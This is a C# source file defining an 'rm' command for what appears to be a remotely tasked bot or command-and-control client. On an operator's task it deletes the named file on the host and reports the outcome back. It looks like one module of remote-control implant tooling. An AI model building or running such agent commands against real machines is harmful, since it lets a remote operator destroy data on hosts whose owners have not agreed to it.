using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;

using System.IO;


namespace pattaya_project_client.Commands.Implements
{
    public class DeleteFile : BotCommand
    {
        public override string TaskName => "rm";

        public override BotTaskResult RunTask(BotTask task)
        {
            var arguments = task.Arguments.Split(' ');

            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
            {

                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = "No file provided"
                };
            }

            var targetFile = arguments[0];


            string currentDir = Directory.GetCurrentDirectory();

            // Join paths
            string fullPath = Path.Combine(currentDir, targetFile);

            if (!File.Exists(fullPath))
            {


                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = $"{targetFile} already not exist"
                };
            }

            try
            {
                File.Delete(fullPath); // Delete the file
            }
            catch (IOException ex)
            {
                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = $"Error deleting file: {ex.Message}"
                };

            }

            if (!File.Exists(fullPath))
            {


                return new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = $"{fullPath} deleted"
                };
            }

            return new BotTaskResult
            {
                TaskId = task.TaskId,
                Result = $"Failed to delete {fullPath}"
            };


        }
    }
}
